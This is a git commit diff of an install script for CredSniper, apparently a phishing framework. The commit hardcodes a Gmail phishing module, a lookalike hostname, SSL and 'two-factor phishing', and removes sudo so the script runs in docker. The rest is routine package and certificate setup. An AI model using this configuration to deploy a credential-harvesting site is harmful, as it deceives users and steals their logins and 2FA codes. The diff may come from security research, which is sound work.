13e1fcaf559cb13d7aa7ea29660b8e62a25655c3
Babak Amin Azad <babak.silverfox@gmail.com>
2019-07-23 15:41:28 -0400

    Modified install.sh to run inside docker

--- install.sh
+++ install.sh
@@ -8,74 +8,14 @@ final=""
 ssl=""
 twofactor=""
 
-read -r -p "Module to deploy (ex: gmail)? " module
-
-if [[ -z "$module" ]] ; then
-    # Exits if no module selected
-    echo "No module selected, exiting..."
-    exit
-fi
-
-read -r -p "Final redirect URL: " final
-
-if [[ -z "$final" ]] ; then
-    # Exits if no final destination URL is set
-    echo "No final destination URL set, exiting..."
-    exit
-fi
-
-read -r -p "Enable SSL? [Y/n] " use_ssl
-read -r -p "Enable two-factor phishing? [Y/n] " use_twofactor
-read -r -p "Enter hostname for certificates (ex: app.example.com): " host_name
-read -r -p "Port to listen on (default: 80/443)? " port
-
-if [[ -z "$use_ssl" ]] ; then
-    # Sets default answer for SSL to 'Yes'
-    use_ssl='Y'
-    ssl='--ssl'
-fi
-
-case "$use_ssl" in
-    # Sets SSL flag for credsniper
-    [yY][eE][sS]|[yY])
-        ssl='--ssl'
-        ;;
-    *)
-        ;;
-esac
-
-if [[ -z "$host_name" ]] ; then
-    # Sets default answer for hostname to the local hostname
-    host_name=$(hostname)
-fi
-
-if [[ -z "$use_twofactor" ]] ; then
-    # Sets default answer for 2FA to 'Yes'
-    use_twofactor='Y'
-    twofactor='--twofactor'
-fi
-
-case "$use_twofactor" in
-    [yY][eE][sS]|[yY])
-        twofactor='--twofactor'
-        ;;
-    *)
-        ;;
-esac
-
-if [[ -z "$port" ]] ; then
-    # Sets default answer for port to 80 or 443
-    case "$use_twofactor" in
-        [yY][eE][sS]|[yY])
-            port=443
-            ;;
-        [nN][oO]|[nN])
-            port=80
-            ;;
-        *)
-            ;;
-    esac
-fi
+module="gmail"
+final="gmail.com"
+use_ssl="Y"
+use_twofactor='Y'
+twofactor='--twofactor'
+host_name="gmail_credsniper.silverf0x00.com"
+ssl="--ssl"
+port=443
 
 echo ""
 echo "[*] Preparing environment..."
@@ -88,13 +28,13 @@ echo "[*] Destination URL: $final"
 echo "[*] Starting credsniper w/ flags: $ssl $twofactor --verbose"
 
 echo "[*] Adding Let's Encypt repository..."
-sudo add-apt-repository ppa:certbot/certbot -y;
+add-apt-repository ppa:certbot/certbot -y;
 
 echo "[*] Updating Apt..."
-sudo apt-get -qq update;
+apt-get -qq update;
 
 echo "[*] Installing pre-reqs..."
-sudo apt-get -qq --assume-yes install python3 virtualenv gnupg certbot;
+apt-get -qq --assume-yes install python3 virtualenv gnupg certbot;
 
 echo "[*] Creating & activating virtual environment..."
 if [ ! -f ./bin/python ]; then
@@ -103,7 +43,7 @@ fi
 
 echo "[*] Enabling port binding for Python..."
 python_path=$(readlink -f ./bin/python)
-sudo setcap CAP_NET_BIND_SERVICE=+eip $python_path;
+setcap CAP_NET_BIND_SERVICE=+eip $python_path;
 
 echo "[*] Installing required Python modules..."
 source ./bin/activate; yes | pip -qq install flask mechanicalsoup pyopenssl
@@ -111,12 +51,12 @@ source ./bin/activate; yes | pip -qq install flask mechanicalsoup pyopenssl
 case "$use_twofactor" in
     [yY][eE][sS]|[yY])
         echo "[*] Creating & installing SSL certificates..."
-        sudo mkdir -p ./certs
-        sudo certbot certonly --standalone --preferred-challenges http -d $host_name
-        sudo cp /etc/letsencrypt/live/$host_name/privkey.pem certs/$host_name.privkey.pem
-        sudo cp /etc/letsencrypt/live/$host_name/cert.pem certs/$host_name.cert.pem
+        mkdir -p ./certs
+        certbot certonly --standalone --preferred-challenges http -d $host_name
+        cp /etc/letsencrypt/live/$host_name/privkey.pem certs/$host_name.privkey.pem
+        cp /etc/letsencrypt/live/$host_name/cert.pem certs/$host_name.cert.pem
         export owner=$(ls -ld . | awk '{print $3}')
-        sudo chown -R $owner:$owner ./certs/
+        chown -R $owner:$owner ./certs/
         ;;
     *)
         ;;
